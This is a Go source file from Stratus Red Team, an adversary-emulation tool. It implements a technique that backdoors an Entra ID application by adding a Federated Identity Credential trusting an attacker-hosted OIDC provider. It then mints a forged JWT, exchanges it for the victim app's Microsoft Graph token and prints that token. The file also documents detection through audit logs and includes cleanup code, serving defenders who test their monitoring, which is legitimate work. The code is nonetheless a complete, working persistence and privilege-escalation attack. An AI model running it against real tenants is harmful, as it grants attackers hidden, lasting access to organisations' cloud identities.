package entra_id

import (
	"context"
	"crypto/rand"
	"crypto/rsa"
	"encoding/base64"
	"encoding/json"
	_ "embed"
	"errors"
	"fmt"
	"io"
	"log"
	"math/big"
	"net/http"
	"net/url"
	"time"

	"github.com/Azure/azure-sdk-for-go/sdk/storage/azblob"
	jwt "github.com/golang-jwt/jwt/v4"
	"github.com/google/uuid"

	"github.com/datadog/stratus-red-team/v2/internal/providers"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	graphmodels "github.com/microsoftgraph/msgraph-sdk-go/models"
)

//go:embed main.tf
var tf []byte

const (
	oidcContainerName = "oidc"
	oidcSubject       = "stratus-red-team-oidc"
	oidcAudience      = "api://AzureADTokenExchange"
	tokenTTL          = 10 * time.Minute
	ficWaitTime       = 30 * time.Second
)

type oidcDiscovery struct {
	Issuer                           string   `json:"issuer"`
	JwksURI                          string   `json:"jwks_uri"`
	ResponseTypesSupported           []string `json:"response_types_supported"`
	SubjectTypesSupported            []string `json:"subject_types_supported"`
	IDTokenSigningAlgValuesSupported []string `json:"id_token_signing_alg_values_supported"`
}

type jwkKey struct {
	Kty string `json:"kty"`
	Use string `json:"use"`
	Alg string `json:"alg"`
	Kid string `json:"kid"`
	N   string `json:"n"`
	E   string `json:"e"`
}

type jwkSet struct {
	Keys []jwkKey `json:"keys"`
}

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "entra-id.persistence.backdoor-application-fic",
		FriendlyName: "Backdoor Entra ID application with Federated Identity Credential (FIC)",
		Description: `
Backdoors an existing Entra ID application by creating a new Federated Identity Credential (FIC) that trusts an attacker-controlled OIDC provider.

Warm-up:

- Create a victim Entra ID application and associated service principal
- Assign it the <code>Directory Readers</code> role at the tenant level (for illustration purposes)
- Create an Azure Storage account to host the attacker-controlled OIDC provider metadata

Detonation:

- Generate a keypair to use for OIDC
- Upload OIDC discovery document and JWKS to the storage account
- Add a Federated Identity Credential (FIC) to the victim application that trusts tokens issued by the malicious OIDC provider
- Create a token signed by the attacker's OIDC private key to exchange for a token as the victim application
- Exchange the attacker's token for a Microsoft Graph token as the victim application using the FIC
- Display the victim application's access token to the user

References:

- https://dirkjanm.io/persisting-with-federated-credentials-entra-apps-managed-identities/
- https://github.com/azurekid/blackcat/pull/84/changes
- https://learn.microsoft.com/en-us/graph/api/resources/federatedidentitycredentials-overview
- https://hackingthe.cloud/aws/post_exploitation/iam_rogue_oidc_identity_provider/

`,
		Detection: `
Using [Entra ID audit logs](https://learn.microsoft.com/en-us/entra/identity/monitoring-health/concept-audit-logs) with the activity type <code>Update application</code>, where <code>modifiedProperties</code> contains <code>FederatedIdentityCredentials</code>.

Sample Entra ID audit log event to monitor:

` + codeBlock + `json hl_lines="3 15 22"
{
  "category": "ApplicationManagement",
  "result": "success",
  "activityDisplayName": "Update application",
  "loggedByService": "Core Directory",
  "operationType": "Update",
  "targetResources": [
    {
      "id": "[REMOVED]",
      "displayName": "Stratus Red Team FIC application ly1h",
      "type": "Application",
      "userPrincipalName": null,
      "groupType": null,
      "modifiedProperties": [
        {
          "displayName": "FederatedIdentityCredentials",
          "oldValue": "[]",
          "newValue": "[{\"Name\":\"stratus-red-team-oidc-fic-ly1h\",\"Issuer\":\"https://stratusficapply1h.blob.core.windows.net/oidc\",\"Subject\":\"stratus-red-team-oidc\",\"Id\":\"[REMOVED]\",\"Description\":\"stratus-red-team-oidc-fic-ly1h\",\"Audiences\":[\"api://AzureADTokenExchange\"],\"ClaimsMatchingExpressionValue\":null,\"ClaimsMatchingExpressionLanguageVersion\":0,\"EncodingVersion\":2,\"TrustedIssuer\":null}]"
        },
        {
          "displayName": "Included Updated Properties",
          "oldValue": null,
          "newValue": "\"FederatedIdentityCredentials\""
        }
      ]
    }
  ]
}
` + codeBlock + `
`,
		Platform:                   stratus.EntraID,
		IsIdempotent:               false,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Persistence, mitreattack.PrivilegeEscalation},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	victimObjectId := params["object_id"]
	victimAppId := params["app_id"]
	storageAccountName := params["storage_account_name"]
	blobServiceURL := params["blob_service_url"]
	suffix := params["random_suffix"]

	graphClient := providers.EntraId().GetGraphClient()
	azureProvider := providers.Azure()

	tenantId, err := providers.EntraId().GetTenantId()
	if err != nil {
		return fmt.Errorf("could not retrieve tenant ID: %w", err)
	}

	// Generate RSA keypair for the attacker-controlled OIDC provider
	log.Println("Generating RSA keypair for attacker OIDC provider...")
	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return fmt.Errorf("could not generate RSA keypair: %w", err)
	}
	keyID := uuid.NewString()

	issuerURL := fmt.Sprintf("https://%s.blob.core.windows.net/%s", storageAccountName, oidcContainerName)

	// Upload OIDC discovery document and JWKS to the storage account
	log.Printf("Uploading OIDC metadata to %s...", issuerURL)
	if err := uploadOIDCDocuments(azureProvider, blobServiceURL, issuerURL, privateKey, keyID); err != nil {
		return fmt.Errorf("could not upload OIDC documents: %w", err)
	}

	// Add FIC to the victim application, trusting the attacker OIDC provider
	log.Println("Adding Federated Identity Credential to victim application...")
	ficIssuer := issuerURL
	ficSubject := oidcSubject
	ficDescription := fmt.Sprintf("stratus-red-team-oidc-fic-%s", suffix)
	ficAudiences := []string{oidcAudience}
	ficNameStr := fmt.Sprintf("stratus-red-team-oidc-fic-%s", suffix)

	requestBody := graphmodels.NewFederatedIdentityCredential()
	requestBody.SetName(&ficNameStr)
	requestBody.SetIssuer(&ficIssuer)
	requestBody.SetSubject(&ficSubject)
	requestBody.SetDescription(&ficDescription)
	requestBody.SetAudiences(ficAudiences)

	fic, err := graphClient.Applications().ByApplicationId(victimObjectId).FederatedIdentityCredentials().Post(context.Background(), requestBody, nil)
	if err != nil {
		return fmt.Errorf("could not create FIC: %w", err)
	}
	log.Printf("Created FIC with ID %s (issuer: %s, subject: %s)", *fic.GetId(), issuerURL, oidcSubject)

	// Wait for FIC and OIDC metadata to propagate
	log.Printf("Waiting %s for FIC and OIDC metadata to propagate...", ficWaitTime)
	time.Sleep(ficWaitTime)

	// Issue token signed by the attacker's OIDC private key
	log.Println("Issuing token as attacker OIDC provider for exchange...")
	oidcToken, err := mintOIDCToken(privateKey, keyID, issuerURL)
	if err != nil {
		return fmt.Errorf("could not create OIDC token: %w", err)
	}

	// Exchange the attacker JWT for a victim application access token
	log.Println("Exchanging OIDC token for victim application access token via FIC...")
	victimToken, err := exchangeTokenUsingFIC(tenantId, victimAppId, oidcToken)
	if err != nil {
		return fmt.Errorf("could not exchange token via FIC: %w", err)
	}

	log.Println("Obtained victim application access token via malicious OIDC FIC backdoor")
	log.Println("Victim application Microsoft Graph token:")
	log.Println("\n" + victimToken)

	log.Println("You can now use this token to access Microsoft Graph API as the victim application:")
	log.Println("WARNING: Using this command in your current CLI session will change your Azure context. You will need to LOG IN AGAIN to clean up this technique.")
	log.Println("\naz login --service-principal --allow-no-subscriptions --tenant " + tenantId + " --username " + victimAppId + " --federated-token \"" + oidcToken + "\"")
	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	victimObjectId := params["object_id"]
	blobServiceURL := params["blob_service_url"]
	graphClient := providers.EntraId().GetGraphClient()
	azureProvider := providers.Azure()

	// Remove FICs from the victim application
	log.Println("Listing FICs for application " + victimObjectId)
	fics, err := graphClient.Applications().ByApplicationId(victimObjectId).FederatedIdentityCredentials().Get(context.Background(), nil)
	if err != nil {
		return errors.New("could not retrieve FICs: " + err.Error())
	}

	for _, credential := range fics.GetValue() {
		ficId := credential.GetId()
		if ficId == nil {
			continue
		}
		log.Println("Deleting FIC with ID " + *ficId)
		err := graphClient.Applications().ByApplicationId(victimObjectId).FederatedIdentityCredentials().ByFederatedIdentityCredentialId(*ficId).Delete(context.Background(), nil)
		if err != nil {
			return errors.New("could not delete FIC: " + err.Error())
		}
	}
	if len(fics.GetValue()) == 0 {
		log.Println("No FICs found to delete")
	} else {
		log.Println("Successfully removed FIC(s) from victim application")
	}

	// Delete the OIDC container (storage account is managed by Terraform)
	log.Printf("Deleting OIDC container from storage account...")
	if err := deleteOIDCContainer(azureProvider, blobServiceURL); err != nil {
		log.Printf("Warning: could not delete OIDC container: %v", err)
	} else {
		log.Println("Deleted OIDC container")
	}

	return nil
}

// deleteOIDCContainer deletes the OIDC container from the storage account.
func deleteOIDCContainer(azureProvider *providers.AzureProvider, blobServiceURL string) error {
	ctx := context.Background()
	blobClient, err := azblob.NewClient(blobServiceURL, azureProvider.GetCredentials(), nil)
	if err != nil {
		return fmt.Errorf("could not create blob client: %w", err)
	}
	_, err = blobClient.DeleteContainer(ctx, oidcContainerName, nil)
	return err
}

// uploadOIDCDocuments creates the OIDC container and uploads the discovery document and JWKS.
func uploadOIDCDocuments(azureProvider *providers.AzureProvider, blobServiceURL, issuerURL string, privateKey *rsa.PrivateKey, keyID string) error {
	ctx := context.Background()
	blobClient, err := azblob.NewClient(blobServiceURL, azureProvider.GetCredentials(), nil)
	if err != nil {
		return fmt.Errorf("could not create blob client: %w", err)
	}

	publicAccess := azblob.PublicAccessTypeBlob
	_, err = blobClient.CreateContainer(ctx, oidcContainerName, &azblob.CreateContainerOptions{
		Access: &publicAccess,
	})
	if err != nil {
		return fmt.Errorf("could not create OIDC container: %w", err)
	}

	pubKey := &privateKey.PublicKey
	jwksDoc := jwkSet{
		Keys: []jwkKey{{
			Kty: "RSA",
			Use: "sig",
			Alg: "RS256",
			Kid: keyID,
			N:   base64.RawURLEncoding.EncodeToString(pubKey.N.Bytes()),
			E:   base64.RawURLEncoding.EncodeToString(big.NewInt(int64(pubKey.E)).Bytes()),
		}},
	}
	jwksJSON, err := json.Marshal(jwksDoc)
	if err != nil {
		return err
	}

	discoveryDoc := oidcDiscovery{
		Issuer:                           issuerURL,
		JwksURI:                          issuerURL + "/jwks",
		ResponseTypesSupported:           []string{"id_token"},
		SubjectTypesSupported:            []string{"public"},
		IDTokenSigningAlgValuesSupported: []string{"RS256"},
	}
	discoveryJSON, err := json.Marshal(discoveryDoc)
	if err != nil {
		return err
	}

	if _, err := blobClient.UploadBuffer(ctx, oidcContainerName, "jwks", jwksJSON, nil); err != nil {
		return fmt.Errorf("could not upload JWKS: %w", err)
	}
	if _, err := blobClient.UploadBuffer(ctx, oidcContainerName, ".well-known/openid-configuration", discoveryJSON, nil); err != nil {
		return fmt.Errorf("could not upload OIDC discovery document: %w", err)
	}

	log.Printf("OIDC discovery: %s/.well-known/openid-configuration", issuerURL)
	log.Printf("JWKS: %s/jwks", issuerURL)
	return nil
}

// mintOIDCToken creates a signed JWT as the attacker OIDC provider, targeting Entra ID token exchange.
func mintOIDCToken(privateKey *rsa.PrivateKey, keyID, issuerURL string) (string, error) {
	claims := jwt.MapClaims{
		"iss": issuerURL,
		"sub": oidcSubject,
		"aud": oidcAudience,
		"iat": time.Now().Unix(),
		"nbf": time.Now().Unix(),
		"exp": time.Now().Add(tokenTTL).Unix(),
		"jti": uuid.NewString(),
	}
	token := jwt.NewWithClaims(jwt.SigningMethodRS256, claims)
	token.Header["kid"] = keyID
	return token.SignedString(privateKey)
}

// exchangeTokenUsingFIC exchanges a client assertion JWT for a victim app token using the FIC.
func exchangeTokenUsingFIC(tenantId, victimClientId, clientAssertion string) (string, error) {
	tokenURL := fmt.Sprintf("https://login.microsoftonline.com/%s/oauth2/v2.0/token", tenantId)

	data := url.Values{}
	data.Set("client_id", victimClientId)
	data.Set("scope", "https://graph.microsoft.com/.default")
	data.Set("client_assertion_type", "urn:ietf:params:oauth:client-assertion-type:jwt-bearer")
	data.Set("client_assertion", clientAssertion)
	data.Set("grant_type", "client_credentials")

	resp, err := http.PostForm(tokenURL, data)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	if resp.StatusCode != 200 {
		return "", fmt.Errorf("token exchange failed with status %d: %s", resp.StatusCode, string(body))
	}

	var result map[string]interface{}
	if err := json.Unmarshal(body, &result); err != nil {
		return "", err
	}

	token, ok := result["access_token"].(string)
	if !ok {
		return "", errors.New("access_token not found in response")
	}
	return token, nil
}
